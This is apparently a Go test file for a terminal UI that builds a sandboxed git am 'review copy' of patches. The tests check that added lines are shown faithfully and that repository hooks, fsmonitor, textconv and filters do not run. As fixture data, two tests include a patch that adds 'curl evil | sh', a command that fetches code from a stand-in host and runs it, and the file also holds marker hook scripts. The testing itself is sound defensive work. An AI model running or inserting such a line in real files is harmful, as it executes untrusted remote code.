package tui

import (
	"context"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"testing"
	"time"

	"github.com/charmbracelet/lipgloss"
	"github.com/charmbracelet/x/ansi"

	"github.com/nicholas1513/handoff/internal/queue"
)

// TestMain keeps the user's git config out of the tests: their hooks, signing and identity.
func TestMain(m *testing.M) {
	for k, v := range map[string]string{"GIT_CONFIG_GLOBAL": os.DevNull, "GIT_CONFIG_NOSYSTEM": "1",
		"GIT_AUTHOR_NAME": "t", "GIT_AUTHOR_EMAIL": "t@x", "GIT_COMMITTER_NAME": "t", "GIT_COMMITTER_EMAIL": "t@x"} {
		os.Setenv(k, v)
	}
	os.Exit(m.Run())
}

func needGit(t testing.TB) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not installed")
	}
}

// gitOut is git's output in dir, failing the test on an error.
func gitOut(t testing.TB, dir string, args ...string) string {
	t.Helper()
	cmd := exec.Command("git", append([]string{"-C", dir}, args...)...)
	var stderr strings.Builder
	cmd.Stderr = &stderr
	out, err := cmd.Output()
	if err != nil {
		t.Fatalf("git %q: %v\n%s", args, err, stderr.String())
	}
	return string(out)
}

// mkRepo is a new repository with files committed and tagged "base", then cfg ("key=value") set in its config.
func mkRepo(t testing.TB, files map[string]string, cfg ...string) string {
	t.Helper()
	dir := t.TempDir()
	gitOut(t, dir, "init", "-q")
	for name, body := range files {
		if err := os.WriteFile(filepath.Join(dir, name), []byte(body), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	gitOut(t, dir, "add", "-A")
	gitOut(t, dir, "commit", "-qm", "base")
	gitOut(t, dir, "tag", "base")
	for _, kv := range cfg {
		k, v, _ := strings.Cut(kv, "=")
		gitOut(t, dir, "config", k, v)
	}
	return dir
}

// commitsPatch is a repository at f = "hello\n" and a format-patch of two commits on it: one changing f, with a "- "
// bullet and a "+ " line in its message and a line too long for the box, and one adding a binary file.
func commitsPatch(t testing.TB) (repo, patch string) {
	t.Helper()
	src := mkRepo(t, map[string]string{"f": "hello\n"})
	os.WriteFile(filepath.Join(src, "f"), []byte("hello\nSTART"+strings.Repeat("wide ", 40)+"END\n"), 0o600)
	gitOut(t, src, "commit", "-qam", "Change f", "-m", "- a bullet\n+ a plus")
	os.WriteFile(filepath.Join(src, "b.bin"), []byte("\x00\x01bin"), 0o600)
	gitOut(t, src, "add", "b.bin")
	gitOut(t, src, "commit", "-qm", "Add b.bin")
	return mkRepo(t, map[string]string{"f": "hello\n"}), tempFile(t, "commits.patch", gitOut(t, src, "format-patch", "--stdout", "base..HEAD"))
}

func fixture(t testing.TB, name string) string {
	p, err := filepath.Abs(filepath.Join("testdata", "am", name+".patch"))
	if err != nil {
		t.Fatal(err)
	}
	return p
}

// amModel is m with an item staging git -C repo am {file:commits.patch}, patch attached, open at w x h. Its last
// Update asked for the review copy; built delivers it.
func amModel(t *testing.T, m model, repo, patch string, w, h int) model {
	t.Helper()
	m = withItem(t, m, queue.Item{Description: "am", Argv: []string{"git", "-C", repo, "am", "{file:commits.patch}"}},
		map[string]string{"commits.patch": patch}, w)
	return resize(m, w, h)
}

// built is m once the review copy it waits for is built and has arrived, as the program delivers it.
func built(m model) model {
	next, _ := m.Update(m.build(context.Background())())
	return next.(model)
}

// cellStart is how a box line drawn in colour c starts on screen: its escape sequence, then the frame's margin.
func cellStart(c lipgloss.TerminalColor) string {
	s, _, _ := strings.Cut(lipgloss.NewStyle().Background(boxBg).Foreground(c).Render("x"), "x")
	return s + " "
}

// fixtureBase is the repository each patch in testdata/am was written against, f = "hello\n" unless named here, and
// its config. fx__real's CRLF lines apply only with am.keepcr, so its repository sets it, which the review copy must
// copy.
func fixtureBase(name string) (map[string]string, []string) {
	switch name {
	case "fromtest__cr", "fromtest__junk":
		return map[string]string{"f": "a\n"}, nil
	case "g__crctx":
		return map[string]string{"f": "a\n\nhello\n"}, nil
	case "rf-bin__bin":
		return map[string]string{"run.sh": "echo hello\n"}, nil
	case "fx__real", "fx__real-nobin":
		return map[string]string{"Makefile": "all:\n\tgo build ./...\n\techo done\n", "a.txt": "hello\nworld\n",
			"b.bin": "\x00\x01\x02bin", "crlf.txt": "line1\r\nline2\r\n", "nonl.txt": "no newline"}, []string{"am.keepcr=true"}
	}
	return map[string]string{"f": "hello\n"}, nil
}

// TestReviewCopyMatchesGitAm: for each adversarial patch from the patch-view reviews (MIME, UTF-7 and ISO-2022-JP,
// fake separators, binary hunks, CRs), the viewer draws what git am makes of it in an independent repository: the
// same summary, and every line git added drawn green and no other. Where git am fails, it draws git's error and the
// raw text.
func TestReviewCopyMatchesGitAm(t *testing.T) {
	needGit(t)
	trueColor(t)
	paths, _ := filepath.Glob(filepath.Join("testdata", "am", "*.patch"))
	if len(paths) != 52 {
		t.Fatalf("%d fixtures, want 52", len(paths))
	}
	green := cellStart(diffColor("+"))
	for _, path := range paths {
		name := strings.TrimSuffix(filepath.Base(path), ".patch")
		t.Run(name, func(t *testing.T) {
			t.Parallel()
			files, cfg := fixtureBase(name)
			patch := fixture(t, name)
			_, m := setup(t)
			m = built(amModel(t, m, mkRepo(t, files, cfg...), patch, 600, 400))
			d := m.detail()
			flat := flatten(d)

			ind := mkRepo(t, files, cfg...)
			am := exec.Command("git", "-C", ind, "am", "-q", patch)
			var stderr strings.Builder
			am.Stderr = &stderr
			if am.Run() != nil {
				first, _, _ := strings.Cut(stderr.String(), "\n")
				raw, _ := os.ReadFile(patch)
				_, subj, _ := strings.Cut(string(raw), "\nSubject: ")
				subj, _, _ = strings.Cut(subj, "\n")
				if !strings.Contains(flat, "⚠ git am: "+sanitize(first)) || !strings.Contains(flat, sanitize("Subject: "+subj)) ||
					strings.Contains(flat, "drawn from git am") {
					t.Fatalf("git am fails with %q: want that error and the raw text drawn:\n%s", first, ansi.Strip(d))
				}
				t.Logf("git am fails: %s; drawn: that error and the raw text", first)
				return
			}

			commits, files_, add, del, bin := gitOut(t, ind, "rev-list", "--count", "base..HEAD"), 0, 0, 0, 0
			for _, l := range splitLines(gitOut(t, ind, "diff", "--numstat", "base", "HEAD")) {
				f := strings.Fields(l)
				a, errA := strconv.Atoi(f[0])
				r, _ := strconv.Atoi(f[1])
				if errA != nil {
					bin++
				}
				files_, add, del = files_+1, add+a, del+r
			}
			n, _ := strconv.Atoi(strings.TrimSpace(commits))
			sum := fmt.Sprintf("%s · %s changed, +%d −%d", count(n, "commit"), count(files_, "file"), add, del)
			if bin > 0 {
				sum = "⚠ " + sum + " · " + count(bin, "binary file")
			}
			if !strings.Contains(flat, sum) {
				t.Fatalf("summary %q not drawn:\n%s", sum, ansi.Strip(d))
			}
			// % marks added lines, which no header line starts with
			var added []string
			for _, l := range splitLines(gitOut(t, ind, "log", "-p", "--format=", "--output-indicator-new=%", "base..HEAD")) {
				if strings.HasPrefix(l, "%") {
					added = append(added, l[1:])
				}
			}
			for _, l := range added {
				if !strings.Contains(d, green+shownDiff("+"+l)) {
					t.Errorf("added line %q is not drawn green", l)
				}
			}
			if got := strings.Count(d, green); got != len(added) {
				t.Errorf("%d rows drawn green, want the %d lines git added:\n%s", got, len(added), ansi.Strip(d))
			}
			t.Logf("%s; %d added lines drawn green", sum, len(added))
		})
	}
}

// TestReviewCopyIsBuiltOffTheLoop: opening an am item returns its build as a command and draws that it is preparing,
// and a result that arrives after the selection moved on is not drawn.
func TestReviewCopyIsBuiltOffTheLoop(t *testing.T) {
	needGit(t)
	_, m := setup(t)
	m = amModel(t, m, mkRepo(t, map[string]string{"f": "hello\n"}), fixture(t, "rv-patchsec__plain"), 120, 40)
	m.focus = 1
	preparing := func(m model) bool { return rowWith(drawn(m, 2), "preparing review copy…") != "" }
	if !preparing(m) {
		t.Fatalf("no preparing line:\n%s", strings.Join(drawn(m, 2), "\n"))
	}
	m, cmd := press(m, "k") // onto "second": nothing to build
	if cmd != nil || preparing(m) {
		t.Fatalf("a plain item asked for a build (%v) or draws one:\n%s", cmd != nil, strings.Join(drawn(m, 2), "\n"))
	}
	m, cmd = press(m, "j")
	if cmd == nil || !preparing(m) {
		t.Fatal("re-opening the am item did not ask for its build")
	}
	late := cmd()
	m, _ = press(m, "k")
	next, _ := m.Update(late)
	if m, cmd = press(next.(model), "j"); cmd == nil || !preparing(m) {
		t.Fatalf("a result that arrived after the selection moved on was drawn:\n%s", strings.Join(drawn(m, 2), "\n"))
	}
	next, _ = m.Update(cmd())
	if m = next.(model); preparing(m) || rowWith(drawn(m, 2), "1 commit · 1 file changed, +1 −1") == "" {
		t.Fatalf("the build's result is not drawn:\n%s", strings.Join(drawn(m, 2), "\n"))
	}
}

func TestReviewCopyOfNoRepository(t *testing.T) {
	needGit(t)
	_, m := setup(t)
	m = built(amModel(t, m, t.TempDir(), fixture(t, "rv-patchsec__plain"), 200, 60))
	if flat := flatten(m.detail()); !strings.Contains(flat, "⚠ git rev-parse: fatal: not a git repository") ||
		!strings.Contains(flat, "Subject: [PATCH] Fix typo") {
		t.Fatalf("want git's error and the raw text:\n%s", ansi.Strip(m.detail()))
	}
}

// TestReviewCopyRunsNoHooks: neither the repository's hooks nor its hooksPath, fsmonitor or textconv commands run
// while the review copy is built and read, nor the user's own filters (git-lfs) on the agent's files. The same patch
// applied by git am in the repository runs them.
func TestReviewCopyRunsNoHooks(t *testing.T) {
	needGit(t)
	marks, hooks := t.TempDir(), t.TempDir()
	mark := func(path, name string) {
		if err := os.WriteFile(path, []byte("#!/bin/sh\ntouch '"+filepath.Join(marks, name)+"'\n"), 0o700); err != nil {
			t.Fatal(err)
		}
	}
	repo := mkRepo(t, map[string]string{"f": "hello\n", ".gitattributes": "* diff=evil filter=lfs\n"})
	for _, h := range []string{"post-checkout", "applypatch-msg", "pre-applypatch", "post-applypatch", "pre-commit",
		"post-commit", "post-rewrite", "reference-transaction"} {
		mark(filepath.Join(repo, ".git", "hooks", h), ".git-hooks-"+h)
		mark(filepath.Join(hooks, h), "hooksPath-"+h)
	}
	mark(filepath.Join(hooks, "fsmonitor"), "fsmonitor")
	mark(filepath.Join(hooks, "textconv"), "textconv")
	for _, kv := range [][2]string{{"core.hooksPath", hooks}, {"core.fsmonitor", filepath.Join(hooks, "fsmonitor")},
		{"diff.evil.textconv", filepath.Join(hooks, "textconv")}} {
		gitOut(t, repo, "config", kv[0], kv[1])
	}
	filter := filepath.Join(hooks, "filter")
	os.WriteFile(filter, []byte("#!/bin/sh\ntouch '"+filepath.Join(marks, "filter")+"'\ncat\n"), 0o700)
	global := tempFile(t, "gitconfig", "[filter \"lfs\"]\n\tclean = "+filter+"\n\tsmudge = "+filter+"\n")
	t.Setenv("GIT_CONFIG_GLOBAL", global)
	_, m := setup(t)
	m = built(amModel(t, m, repo, fixture(t, "rv-patchsec__plain"), 120, 40))
	if rowWith(drawn(m, 2), "1 commit · 1 file changed, +1 −1") == "" {
		t.Fatalf("not built:\n%s", strings.Join(drawn(m, 2), "\n"))
	}
	if ents, _ := os.ReadDir(marks); len(ents) > 0 {
		t.Errorf("%s ran", ents[0].Name())
	}
	gitOut(t, repo, "am", "-q", fixture(t, "rv-patchsec__plain"))
	gitOut(t, repo, "log", "-p", "-1")
	if ents, _ := os.ReadDir(marks); len(ents) < 3 {
		t.Errorf("control: git am in the repository ran %d of the hooks", len(ents))
	}
}

func TestSweepRemovesFinishedItemsReviewCopies(t *testing.T) {
	q, _ := setup(t)
	items, _, _ := q.List()
	finished(t, q, items[0], queue.Succeeded, "")
	for _, id := range []string{items[0].ID, items[1].ID, "gone"} {
		if err := os.MkdirAll(filepath.Join(reviewDir(q.Root, id), "x"), 0o700); err != nil {
			t.Fatal(err)
		}
	}
	sweep(q)()
	for id, keep := range map[string]bool{items[0].ID: false, items[1].ID: true, "gone": false} {
		if _, err := os.Stat(reviewDir(q.Root, id)); (err == nil) != keep {
			t.Errorf("%s: kept %v, want %v", id, err == nil, keep)
		}
	}
}

// onePatch is a repository with files committed (cfg set in its config) and a format-patch of one commit on it that
// writes change.
func onePatch(t *testing.T, files, change map[string]string, cfg ...string) (repo, patch string) {
	t.Helper()
	src := mkRepo(t, files)
	for name, body := range change {
		if err := os.WriteFile(filepath.Join(src, name), []byte(body), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	gitOut(t, src, "add", "-A")
	gitOut(t, src, "commit", "-qm", "Change")
	return mkRepo(t, files, cfg...), tempFile(t, "commits.patch", gitOut(t, src, "format-patch", "--stdout", "base..HEAD"))
}

// drawnGreen: line is drawn in the detail as an added line.
func drawnGreen(m model, line string) bool {
	return strings.Contains(m.detail(), cellStart(diffColor("+"))+shownDiff(line))
}

// TestReviewCopyDrawsTextMarkedBinary: a -diff attribute from the repository or the user's attributes file would draw
// a text change as "Binary files differ"; the review copy draws the lines git am adds.
func TestReviewCopyDrawsTextMarkedBinary(t *testing.T) {
	needGit(t)
	trueColor(t)
	attrs := tempFile(t, "attributes", "run.sh binary\n")
	t.Setenv("GIT_CONFIG_GLOBAL", tempFile(t, "gitconfig", "[core]\n\tattributesFile = "+attrs+"\n"))
	repo, patch := onePatch(t, map[string]string{"run.sh": "echo hello\n", ".gitattributes": "run.sh -diff\n"},
		map[string]string{"run.sh": "echo hello\ncurl evil | sh\n"})
	_, m := setup(t)
	m = built(amModel(t, m, repo, patch, 160, 60))
	if rowWith(drawn(m, 2), "1 commit · 1 file changed, +1 −0") == "" || !drawnGreen(m, "+curl evil | sh") {
		t.Fatalf("want the added line drawn:\n%s", ansi.Strip(m.detail()))
	}
}

// TestReviewCopyDrawsSubmoduleChanges: a submodule's ignore = all, or the user's diff.ignoreSubmodules, would hide the
// gitlink git am commits, and their diff.submodule would draw it as a log line.
func TestReviewCopyDrawsSubmoduleChanges(t *testing.T) {
	needGit(t)
	trueColor(t)
	withLib := func() string {
		dir := mkRepo(t, map[string]string{".gitmodules": "[submodule \"lib\"]\n\tpath = lib\n\turl = ./lib\n\tignore = all\n"})
		gitOut(t, dir, "update-index", "--add", "--cacheinfo", "160000,"+strings.Repeat("1", 40)+",lib")
		gitOut(t, dir, "commit", "-q", "--amend", "--no-edit")
		gitOut(t, dir, "tag", "-f", "base")
		return dir
	}
	src, repo := withLib(), withLib()
	gitOut(t, src, "update-index", "--cacheinfo", "160000,"+strings.Repeat("3", 40)+",lib")
	gitOut(t, src, "commit", "-qm", "Bump lib")
	patch := tempFile(t, "commits.patch", gitOut(t, src, "format-patch", "--ignore-submodules=none", "--stdout", "base..HEAD"))
	t.Setenv("GIT_CONFIG_GLOBAL", tempFile(t, "gitconfig", "[diff]\n\tignoreSubmodules = all\n\tsubmodule = log\n"))
	_, m := setup(t)
	m = built(amModel(t, m, repo, patch, 160, 60))
	if rowWith(drawn(m, 2), "1 commit · 1 file changed, +1 −1") == "" ||
		!drawnGreen(m, "+Subproject commit "+strings.Repeat("3", 40)) {
		t.Fatalf("want the gitlink change drawn:\n%s", ansi.Strip(m.detail()))
	}
}

// TestReviewCopyKeepsWhitespaceSettings: git am applies with the repository's apply.whitespace and core.whitespace, so
// the review copy does too: the bytes it commits are the run's, and a patch the run refuses is drawn as refused.
func TestReviewCopyKeepsWhitespaceSettings(t *testing.T) {
	needGit(t)
	files := map[string]string{"Makefile": "all:\n\tgo build\n"}
	change := map[string]string{"Makefile": "all:\n\tgo build\n\tgo vet   \n"}
	cfg := []string{"apply.whitespace=fix", "core.whitespace=tab-in-indent"}
	repo, patch := onePatch(t, files, change, cfg...)
	_, m := setup(t)
	m = built(amModel(t, m, repo, patch, 160, 60))
	ind := mkRepo(t, files, cfg...)
	gitOut(t, ind, "am", "-q", patch)
	got := gitOut(t, reviewDir(m.q.Root, m.reviewed.Item.ID), "show", "reviewed:Makefile")
	if want := gitOut(t, ind, "show", "HEAD:Makefile"); got != want || m.am.err != "" {
		t.Fatalf("review copy committed %q (%s), git am in the repository %q", got, m.am.err, want)
	}

	repo, patch = onePatch(t, files, change, "apply.whitespace=error")
	_, m = setup(t)
	if m = built(amModel(t, m, repo, patch, 160, 60)); !strings.Contains(flatten(m.detail()), "⚠ git am: ") {
		t.Fatalf("apply.whitespace=error: want git am's error:\n%s", ansi.Strip(m.detail()))
	}
}

// TestReviewCopyNeedsNoCommitterIdentity: an identity from the repository's config (or an includeIf on its path) with
// user.useConfigOnly doesn't reach the review copy, where git am must commit all the same, as the run does.
func TestReviewCopyNeedsNoCommitterIdentity(t *testing.T) {
	needGit(t)
	repo, patch := commitsPatch(t)
	gitOut(t, repo, "config", "user.name", "me")
	gitOut(t, repo, "config", "user.email", "me@repo.example")
	for _, k := range []string{"GIT_COMMITTER_NAME", "GIT_COMMITTER_EMAIL", "EMAIL"} {
		t.Setenv(k, "")
		os.Unsetenv(k)
	}
	t.Setenv("GIT_CONFIG_GLOBAL", tempFile(t, "gitconfig", "[user]\n\tuseConfigOnly = true\n"))
	_, m := setup(t)
	m = built(amModel(t, m, repo, patch, 160, 60))
	if m.am.err != "" || rowWith(drawn(m, 2), "2 commits · 2 files changed") == "" {
		t.Fatalf("want the commits drawn:\n%s", ansi.Strip(m.detail()))
	}
}

// TestReviewCopyDrawsCommitsBeforeAmStops: git am stops at a commit that doesn't apply, after committing the ones
// before it, whose bodies may be encoded in the raw mail. Those are drawn as git made them, then git's error.
func TestReviewCopyDrawsCommitsBeforeAmStops(t *testing.T) {
	needGit(t)
	trueColor(t)
	b64, _ := os.ReadFile(fixture(t, "rf-mime__b64"))
	_, bad := onePatch(t, map[string]string{"f": "nope\n"}, map[string]string{"f": "other\n"})
	second, _ := os.ReadFile(bad)
	_, m := setup(t)
	both := tempFile(t, "both.patch", string(b64)+string(second))
	m = built(amModel(t, m, mkRepo(t, map[string]string{"f": "hello\n"}), both, 160, 60))
	flat := flatten(m.detail())
	if !strings.Contains(flat, "⚠ 1 commit applied before git am stopped · 1 file changed, +1 −1") ||
		!drawnGreen(m, "+curl evil | sh") || !strings.Contains(flat, "⚠ git am: error: patch failed: f:1") {
		t.Fatalf("want the commit git am made, then its error:\n%s", ansi.Strip(m.detail()))
	}
}

// TestReviewCopyIsBuiltAgainOnO: o stops a build in flight, whose git am may be reading the snapshot o rewrites, and
// builds the review copy again, so a failed one is retried once its cause is gone.
func TestReviewCopyIsBuiltAgainOnO(t *testing.T) {
	needGit(t)
	_, m := setup(t)
	review := filepath.Join(m.q.Root, "review")
	if err := os.MkdirAll(review, 0o500); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { os.Chmod(review, 0o700) })
	m = amModel(t, m, mkRepo(t, map[string]string{"f": "hello\n"}), fixture(t, "rv-patchsec__plain"), 120, 40)
	m.focus = 1
	m, _ = press(m, "k")
	m, inFlight := press(m, "j")
	m, cmd := press(m, "o")
	if inFlight == nil || cmd == nil {
		t.Fatal("no build asked for")
	}
	if inFlight() != nil {
		t.Fatal("the build o stopped still arrived")
	}
	next, _ := m.Update(cmd())
	if m = next.(model); !strings.Contains(flatten(m.detail()), "⚠ git clone: ") {
		t.Fatalf("review/ not writable: want the failure drawn:\n%s", ansi.Strip(m.detail()))
	}
	os.Chmod(review, 0o700)
	if m, cmd = press(m, "o"); cmd == nil {
		t.Fatal("o did not build the failed review copy again")
	}
	next, _ = m.Update(cmd())
	if m = next.(model); rowWith(drawn(m, 2), "1 commit · 1 file changed, +1 −1") == "" {
		t.Fatalf("not built again:\n%s", ansi.Strip(m.detail()))
	}
}

// TestAmItemRunsOnceItsCopyIsDrawn: while the review copy is being prepared nothing of the patch is on screen, so
// neither space space nor Run starts the run; once it is drawn, both do.
func TestAmItemRunsOnceItsCopyIsDrawn(t *testing.T) {
	needGit(t)
	repo, patch := commitsPatch(t)
	_, m := setup(t)
	m = amModel(t, m, repo, patch, 160, 60)
	m.focus, m.advancedAt = 2, time.Time{}
	m, _ = press(m, " ")
	m, cmd := press(m, " ")
	if cmd != nil || !strings.Contains(statusLine(m), notReady) {
		t.Fatalf("space space ran an am item before its review copy was drawn (status %q)", statusLine(m))
	}
	sw, iw, _ := columns(m.w)
	if m, _ = click(m, sw+iw+runX+1, buttonY); m.confirm {
		t.Fatal("Run asks to confirm an am item before its review copy is drawn")
	}
	if m = built(m); strings.Contains(statusLine(m), notReady) {
		t.Fatalf("still says %q once drawn", notReady)
	}
	if c, _ := click(m, sw+iw+runX+1, buttonY); !c.confirm {
		t.Fatal("Run does not ask to confirm once its review copy is drawn")
	}
	m, _ = press(m, " ")
	if _, cmd = press(m, " "); cmd == nil {
		t.Fatal("space space does not run it once its review copy is drawn")
	}
}
